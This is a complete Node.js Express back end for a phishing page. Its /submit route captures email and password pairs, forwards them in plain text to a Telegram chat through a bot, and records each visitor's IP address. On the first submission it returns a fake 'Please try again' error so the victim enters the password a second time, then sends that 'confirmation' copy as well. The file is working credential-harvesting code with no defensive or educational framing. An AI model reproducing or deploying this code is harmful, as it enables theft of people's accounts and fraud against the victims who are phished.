require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cors());

app.use(express.static(__dirname));

// ---------- Telegram ----------
const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;
if (!botToken || !chatId) {
    throw new Error('Missing BOT_TOKEN or CHAT_ID environment variables.');
}
const bot = new TelegramBot(botToken, { polling: false });

// ---------- In-memory IP counter ----------
const ipSubmissionCounts = {};

// ---------- Middleware – Get REAL client IP ----------
app.use((req, res, next) => {
    // Try X-Forwarded-For first (set by Nginx)
    let ip = req.headers['x-forwarded-for'];
    if (ip) {
        // x-forwarded-for can be: "client, proxy1, proxy2"
        ip = ip.split(',')[0].trim();
    } else {
        // Fallback to remoteAddress
        ip = req.connection.remoteAddress || req.socket.remoteAddress || '';
        // Remove ::ffff: prefix for IPv4 mapped IPv6
        if (ip.includes('::ffff:')) ip = ip.split('::ffff:')[1];
    }
    req.clientIp = ip;
    req.originalEmail = req.query.email || '';
    next();
});

// ---------- POST /submit ----------
app.post('/submit', (req, res) => {
    const { email, password } = req.body;
    const clientIp = req.clientIp;
    const originalEmail = req.originalEmail || email;

    if (!email || !email.includes('@') || !password) {
        return res.status(400).json({ error: 'Email and password are required' });
    }

    // Initialize counter for this IP
    if (!ipSubmissionCounts[clientIp]) {
        ipSubmissionCounts[clientIp] = 0;
        console.log(`New IP detected: ${clientIp} – starting fresh`);
    }

    ipSubmissionCounts[clientIp]++;

    const cnt = ipSubmissionCounts[clientIp];

    // 1st submission
    if (cnt === 1) {
        const msg = `First Submission:\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toISOString()}`;
        bot.sendMessage(chatId, msg).catch(e => console.error('TG error:', e));
        return res.status(400).json({ error: 'Error: Please try again.' });
    }

    // 2nd submission
    if (cnt === 2) {
        const msg = `Successful Confirmation:\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toISOString()}`;
        bot.sendMessage(chatId, msg).catch(e => console.error('TG error:', e));
        return res.json({
            message: 'Successful confirmation',
            redirect: '/success' + (originalEmail ? '?email=' + encodeURIComponent(originalEmail) : '')
        });
    }

    // 3rd+ submission — NO Telegram
    return res.json({ message: 'Process already completed.' });
});

// ---------- GET /success ----------
app.get('/success', (req, res) => {
    res.sendFile(path.join(__dirname, 'success.html'));
});

app.listen(port, () => console.log(`Server listening on :${port}`));